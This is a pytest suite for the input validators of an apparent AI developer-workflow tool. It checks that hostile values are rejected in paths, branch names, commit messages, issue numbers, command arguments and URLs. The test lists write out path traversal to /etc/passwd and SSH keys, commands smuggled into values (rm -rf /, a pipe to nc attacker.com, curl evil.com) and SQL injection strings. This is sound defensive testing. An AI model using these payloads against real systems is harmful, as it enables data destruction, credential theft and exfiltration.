"""Comprehensive security tests for input validation.

Tests cover:
- Path traversal attempts
- Command injection attempts
- SQL injection patterns
- Oversized inputs
- Invalid characters
- Boundary conditions
"""

import pytest
from pydantic import ValidationError
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from adw_modules.validators import (
    SafeUserInput,
    SafeFilePath,
    SafeGitBranch,
    SafeCommitMessage,
    SafeIssueNumber,
    SafeADWID,
    SafeCommandArgs,
    SafeAgentName,
    SafeSlashCommand,
    SafeDocsUrl,
    validate_file_path,
    validate_branch_name,
    validate_commit_message,
    validate_issue_number,
    validate_adw_id,
    validate_subprocess_command,
)


class TestSafeUserInput:
    """Test user input validation."""

    def test_valid_prompt(self):
        """Test valid user prompt."""
        prompt = "Implement authentication feature"
        validated = SafeUserInput(prompt=prompt)
        assert validated.prompt == prompt

    def test_empty_prompt(self):
        """Test empty prompt rejection."""
        with pytest.raises(ValidationError):
            SafeUserInput(prompt="")

    def test_whitespace_only_prompt(self):
        """Test whitespace-only prompt rejection."""
        with pytest.raises(ValidationError):
            SafeUserInput(prompt="   ")

    def test_null_byte_in_prompt(self):
        """Test null byte rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeUserInput(prompt="test\x00malicious")
        assert "Null bytes not allowed" in str(exc_info.value)

    def test_oversized_prompt(self):
        """Test oversized prompt rejection."""
        oversized = "A" * 100001  # Over 100KB limit
        with pytest.raises(ValidationError):
            SafeUserInput(prompt=oversized)

    def test_prompt_with_code_examples(self):
        """Test that code examples with special chars are allowed."""
        prompt = "Fix this: if (x > 5) { echo 'test'; }"
        validated = SafeUserInput(prompt=prompt)
        assert validated.prompt == prompt


class TestSafeFilePath:
    """Test file path validation."""

    def test_valid_path_specs(self):
        """Test valid path in specs directory."""
        path = "specs/issue-001.md"
        validated = SafeFilePath(file_path=path)
        assert validated.file_path == path

    def test_valid_path_agents(self):
        """Test valid path in agents directory."""
        path = "agents/ADW-123/planner/plan.md"
        validated = SafeFilePath(file_path=path)
        assert validated.file_path == path

    def test_path_traversal_dotdot(self):
        """Test path traversal with .. rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeFilePath(file_path="specs/../../../etc/passwd")
        assert "Directory traversal" in str(exc_info.value)

    def test_path_traversal_encoded(self):
        """Test encoded path traversal rejection."""
        # Even though URL encoding won't be decoded, the pattern should be blocked
        with pytest.raises(ValidationError):
            SafeFilePath(file_path="specs/../../etc/passwd")

    def test_system_directory_access(self):
        """Test system directory access rejection."""
        dangerous_paths = [
            "/etc/passwd",
            "/sys/kernel",
            "/proc/self",
            "/dev/null",
            "/root/.ssh/id_rsa",
        ]
        for path in dangerous_paths:
            with pytest.raises(ValidationError) as exc_info:
                SafeFilePath(file_path=path)
            assert "system directory" in str(exc_info.value).lower()

    def test_null_byte_in_path(self):
        """Test null byte rejection in path."""
        with pytest.raises(ValidationError) as exc_info:
            SafeFilePath(file_path="specs/test\x00.md")
        assert "Null bytes not allowed" in str(exc_info.value)

    def test_invalid_prefix(self):
        """Test path with invalid prefix."""
        with pytest.raises(ValidationError) as exc_info:
            SafeFilePath(file_path="unauthorized/file.md")
        assert "must start with one of" in str(exc_info.value)

    def test_empty_path(self):
        """Test empty path rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeFilePath(file_path="")
        assert "cannot be empty" in str(exc_info.value)

    def test_oversized_path(self):
        """Test oversized path rejection."""
        oversized = "specs/" + "a" * 5000 + ".md"
        with pytest.raises(ValidationError):
            SafeFilePath(file_path=oversized)


class TestSafeGitBranch:
    """Test git branch name validation."""

    def test_valid_branch_name(self):
        """Test valid branch name."""
        branch = "feature/issue-001-adw-ext001-auth"
        validated = SafeGitBranch(branch_name=branch)
        assert validated.branch_name == branch

    def test_branch_with_underscores(self):
        """Test branch name with underscores."""
        branch = "feature/user_auth_system"
        validated = SafeGitBranch(branch_name=branch)
        assert validated.branch_name == branch

    def test_branch_invalid_characters(self):
        """Test branch with invalid characters."""
        invalid_branches = [
            "feature@issue",
            "feature#123",
            "feature$bug",
            "feature;rm -rf",
            "feature|cat /etc/passwd",
        ]
        for branch in invalid_branches:
            with pytest.raises(ValidationError):
                SafeGitBranch(branch_name=branch)

    def test_branch_starts_with_slash(self):
        """Test branch starting with slash."""
        with pytest.raises(ValidationError) as exc_info:
            SafeGitBranch(branch_name="/feature")
        assert "cannot start/end with" in str(exc_info.value)

    def test_branch_ends_with_slash(self):
        """Test branch ending with slash."""
        with pytest.raises(ValidationError) as exc_info:
            SafeGitBranch(branch_name="feature/")
        assert "cannot start/end with" in str(exc_info.value)

    def test_reserved_branch_names(self):
        """Test reserved branch name rejection."""
        reserved = ["HEAD", "master", "main", "Master", "MAIN"]
        for branch in reserved:
            with pytest.raises(ValidationError) as exc_info:
                SafeGitBranch(branch_name=branch)
            assert "reserved branch name" in str(exc_info.value)

    def test_double_slashes(self):
        """Test double slashes rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeGitBranch(branch_name="feature//test")
        assert "Double slashes not allowed" in str(exc_info.value)

    def test_oversized_branch_name(self):
        """Test oversized branch name."""
        oversized = "feature/" + "a" * 300
        with pytest.raises(ValidationError):
            SafeGitBranch(branch_name=oversized)


class TestSafeCommitMessage:
    """Test commit message validation."""

    def test_valid_commit_message(self):
        """Test valid commit message."""
        message = "feat: Add authentication system\n\nImplemented JWT-based auth"
        validated = SafeCommitMessage(message=message)
        assert validated.message == message.strip()

    def test_empty_commit_message(self):
        """Test empty commit message rejection."""
        with pytest.raises(ValidationError):
            SafeCommitMessage(message="")

    def test_whitespace_only_message(self):
        """Test whitespace-only message rejection."""
        with pytest.raises(ValidationError):
            SafeCommitMessage(message="   \n  ")

    def test_command_injection_patterns(self):
        """Test command injection pattern rejection."""
        malicious_patterns = [
            "feat: $(rm -rf /)",
            "fix: `cat /etc/passwd`",
            "chore: test | nc attacker.com 1234",
            "feat: test && rm -rf /",
            "fix: test || echo 'hacked'",
            "chore: test; curl evil.com",
        ]
        for message in malicious_patterns:
            with pytest.raises(ValidationError) as exc_info:
                SafeCommitMessage(message=message)
            assert "dangerous pattern" in str(exc_info.value).lower()

    def test_null_byte_in_message(self):
        """Test null byte rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeCommitMessage(message="feat: test\x00malicious")
        assert "Null bytes not allowed" in str(exc_info.value)

    def test_oversized_commit_message(self):
        """Test oversized commit message."""
        oversized = "A" * 6000
        with pytest.raises(ValidationError):
            SafeCommitMessage(message=oversized)


class TestSafeIssueNumber:
    """Test issue number validation."""

    def test_valid_issue_number(self):
        """Test valid issue number."""
        validated = SafeIssueNumber(issue_number="123")
        assert validated.issue_number == "123"

    def test_single_digit(self):
        """Test single digit issue number."""
        validated = SafeIssueNumber(issue_number="1")
        assert validated.issue_number == "1"

    def test_large_issue_number(self):
        """Test large issue number."""
        validated = SafeIssueNumber(issue_number="999999")
        assert validated.issue_number == "999999"

    def test_negative_issue_number(self):
        """Test negative issue number rejection."""
        with pytest.raises(ValidationError):
            SafeIssueNumber(issue_number="-1")

    def test_zero_issue_number(self):
        """Test zero issue number rejection."""
        with pytest.raises(ValidationError) as exc_info:
            SafeIssueNumber(issue_number="0")
        assert "must be positive" in str(exc_info.value)

    def test_non_numeric_issue_number(self):
        """Test non-numeric issue number rejection."""
        invalid = ["abc", "12a", "1.5", "1e5", "1-2"]
        for num in invalid:
            with pytest.raises(ValidationError):
                SafeIssueNumber(issue_number=num)

    def test_sql_injection_attempt(self):
        """Test SQL injection pattern rejection."""
        sql_patterns = [
            "1 OR 1=1",
            "1'; DROP TABLE issues--",
            "1 UNION SELECT * FROM users",
        ]
        for pattern in sql_patterns:
            with pytest.raises(ValidationError):
                SafeIssueNumber(issue_number=pattern)

    def test_oversized_issue_number(self):
        """Test oversized issue number."""
        with pytest.raises(ValidationError):
            SafeIssueNumber(issue_number="12345678901")


class TestSafeADWID:
    """Test ADW ID validation."""

    def test_valid_adw_id(self):
        """Test valid ADW ID."""
        validated = SafeADWID(adw_id="ADW-EXT001")
        assert validated.adw_id == "ADW-EXT001"

    def test_adw_id_with_numbers(self):
        """Test ADW ID with numbers."""
        validated = SafeADWID(adw_id="ADW-123ABC")
        assert validated.adw_id == "ADW-123ABC"

    def test_adw_id_invalid_format(self):
        """Test ADW ID with invalid format."""
        invalid = [
            "adw-123",  # lowercase
            "ADW_123",  # underscore
            "123-ADW",  # wrong order
            "ADW",      # no suffix
            "ADW-",     # empty suffix
        ]
        for adw_id in invalid:
            with pytest.raises(ValidationError):
                SafeADWID(adw_id=adw_id)

    def test_adw_id_with_special_chars(self):
        """Test ADW ID with special characters."""
        invalid = [
            "ADW-123@456",
            "ADW-TEST;rm",
            "ADW-$(pwd)",
        ]
        for adw_id in invalid:
            with pytest.raises(ValidationError):
                SafeADWID(adw_id=adw_id)

    def test_oversized_adw_id(self):
        """Test oversized ADW ID."""
        oversized = "ADW-" + "A" * 100
        with pytest.raises(ValidationError):
            SafeADWID(adw_id=oversized)


class TestSafeCommandArgs:
    """Test command argument validation."""

    def test_valid_git_command(self):
        """Test valid git command."""
        validated = SafeCommandArgs(
            command="git",
            args=["status"],
            allowed_commands=["git", "gh"]
        )
        assert validated.command == "git"
        assert len(validated.args) == 1

    def test_command_with_metacharacters(self):
        """Test command with shell metacharacters."""
        with pytest.raises(ValidationError) as exc_info:
            SafeCommandArgs(command="git; rm -rf /")
        assert "metacharacters not allowed" in str(exc_info.value).lower()

    def test_command_not_in_whitelist(self):
        """Test command not in whitelist."""
        with pytest.raises(ValidationError) as exc_info:
            SafeCommandArgs(
                command="curl",
                allowed_commands=["git", "gh"]
            )
        assert "not in whitelist" in str(exc_info.value)

    def test_args_with_null_bytes(self):
        """Test arguments with null bytes."""
        with pytest.raises(ValidationError) as exc_info:
            SafeCommandArgs(
                command="git",
                args=["status\x00--help"]
            )
        assert "Null bytes not allowed" in str(exc_info.value)

    def test_args_are_quoted(self):
        """Test that arguments are properly quoted."""
        validated = SafeCommandArgs(
            command="git",
            args=["commit", "-m", "feat: test message"]
        )
        # Args should be quoted for safety
        assert all(arg for arg in validated.args)


class TestSafeAgentName:
    """Test agent name validation."""

    def test_valid_agent_name(self):
        """Test valid agent name."""
        validated = SafeAgentName(agent_name="sdlc_planner")
        assert validated.agent_name == "sdlc_planner"

    def test_agent_name_numbers(self):
        """Test agent name with numbers."""
        validated = SafeAgentName(agent_name="agent_v2")
        assert validated.agent_name == "agent_v2"

    def test_agent_name_invalid_chars(self):
        """Test agent name with invalid characters."""
        invalid = [
            "agent-name",  # hyphen
            "agent name",  # space
            "agent@123",   # special char
            "AGENT",       # uppercase
        ]
        for name in invalid:
            with pytest.raises(ValidationError):
                SafeAgentName(agent_name=name)

    def test_agent_name_starts_with_underscore(self):
        """Test agent name starting with underscore."""
        with pytest.raises(ValidationError) as exc_info:
            SafeAgentName(agent_name="_agent")
        assert "cannot start or end" in str(exc_info.value)

    def test_agent_name_double_underscore(self):
        """Test agent name with double underscore."""
        with pytest.raises(ValidationError) as exc_info:
            SafeAgentName(agent_name="agent__name")
        assert "double underscores" in str(exc_info.value)


class TestSafeSlashCommand:
    """Test slash command validation."""

    def test_valid_slash_commands(self):
        """Test valid slash commands."""
        valid_commands = [
            "/chore", "/bug", "/feature",
            "/classify_issue", "/implement", "/test"
        ]
        for cmd in valid_commands:
            validated = SafeSlashCommand(command=cmd)
            assert validated.command == cmd

    def test_command_without_slash(self):
        """Test command without leading slash."""
        with pytest.raises(ValidationError) as exc_info:
            SafeSlashCommand(command="feature")
        assert "must start with" in str(exc_info.value)

    def test_invalid_slash_command(self):
        """Test invalid slash command."""
        with pytest.raises(ValidationError) as exc_info:
            SafeSlashCommand(command="/malicious")
        assert "Invalid slash command" in str(exc_info.value)

    def test_command_injection_attempt(self):
        """Test command injection via slash command."""
        with pytest.raises(ValidationError):
            SafeSlashCommand(command="/feature; rm -rf")


class TestSafeDocsUrl:
    """Test documentation URL validation."""

    def test_valid_https_url(self):
        """Test valid HTTPS URL."""
        validated = SafeDocsUrl(url="https://docs.example.com/api")
        assert str(validated.url) == "https://docs.example.com/api"

    def test_valid_http_url(self):
        """Test valid HTTP URL."""
        validated = SafeDocsUrl(url="http://localhost:8000/docs")
        assert str(validated.url) == "http://localhost:8000/docs"

    def test_invalid_protocol(self):
        """Test invalid protocol rejection."""
        invalid_urls = [
            "file:///etc/passwd",
            "ftp://example.com",
            "javascript:alert(1)",
        ]
        for url in invalid_urls:
            with pytest.raises(ValidationError):
                SafeDocsUrl(url=url)


class TestUtilityFunctions:
    """Test utility validation functions."""

    def test_validate_file_path_function(self):
        """Test validate_file_path utility."""
        result = validate_file_path("specs/test.md")
        assert result == "specs/test.md"

    def test_validate_branch_name_function(self):
        """Test validate_branch_name utility."""
        result = validate_branch_name("feature/test")
        assert result == "feature/test"

    def test_validate_commit_message_function(self):
        """Test validate_commit_message utility."""
        result = validate_commit_message("feat: test")
        assert result == "feat: test"

    def test_validate_issue_number_function(self):
        """Test validate_issue_number utility."""
        result = validate_issue_number("123")
        assert result == "123"

    def test_validate_adw_id_function(self):
        """Test validate_adw_id utility."""
        result = validate_adw_id("ADW-TEST123")
        assert result == "ADW-TEST123"

    def test_validate_subprocess_command_function(self):
        """Test validate_subprocess_command utility."""
        cmd, args = validate_subprocess_command(
            "git",
            ["status"],
            ["git", "gh"]
        )
        assert cmd == "git"
        assert len(args) == 1


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])
